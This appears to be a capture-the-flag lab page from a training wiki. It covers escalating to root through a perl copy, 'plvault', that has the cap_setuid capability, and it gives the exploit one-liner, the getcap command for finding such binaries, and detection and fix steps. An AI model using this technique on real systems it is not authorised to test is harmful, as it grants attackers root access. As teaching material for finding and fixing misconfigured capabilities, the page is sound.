# C05 · Station B — cap_setuid on perl · ★★☆☆

> **Chapter:** [[Chapter-05-Overview]] · **Next:** [[C05-Station-C-cap_dac_read_search-tar]]
> **Host:** `hollow-vault-01` (`target-caps`) · **Binary:** `/usr/local/bin/plvault`
> **The bug:** a copy of perl carries `cap_setuid=ep`.

---

## 1. Exploit — do this first

```bash
plvault -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
id ; cat /root/flag.txt
```

---

## 2. How you find it

```bash
getcap -r / 2>/dev/null | grep setuid
# /usr/local/bin/plvault cap_setuid=ep
```
Same class as Station A, a different runtime — your recon has to enumerate
*every* capped binary, not stop at the first interpreter.

## 3. Why it works

`POSIX::setuid(0)` is a thin wrapper over the `setuid(2)` syscall; the file
capability makes it succeed. `exec` replaces the Perl process with a root shell.

## 4. Pitfalls

- `use POSIX qw(setuid)` — `setuid` isn't a builtin; import it from POSIX.
- As with A, `gid` stays yours; uid 0 is the win.

## 5. Detect & fix

- **Detect:** `getcap -r / | grep setuid`.
- **Fix:** remove the capability. See [[Blue-Team-Playbook]].

## 6. What you learned

- The language is irrelevant; the capability is the vulnerability.

> Next: [[C05-Station-C-cap_dac_read_search-tar]] · Related: [[C05-Station-A-cap_setuid-python]]
